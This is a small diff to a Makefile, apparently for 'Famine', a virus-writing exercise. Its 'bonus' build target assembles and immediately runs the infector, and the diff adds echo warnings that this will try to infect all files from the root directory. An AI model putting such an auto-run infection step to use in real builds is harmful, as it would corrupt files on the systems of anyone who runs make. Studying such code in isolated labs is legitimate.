@@ -73,6 +73,8 @@ bonus: fclean
 	mkdir -p $(OBJ_DIR)
 	$(AS) $(ASFLAGS) -DBONUS_MODE $(SRC_S) -o $(OBJ_DIR)/main.o
 	ld $(OBJ_DIR)/main.o -o $(TARGET)
+	@echo "WARNING: About to execute Famine targeting root directory /"
+	@echo "This will attempt to infect all files system-wide."
 	./$(TARGET)
 
 # Dummy target so `make test -v` works without error
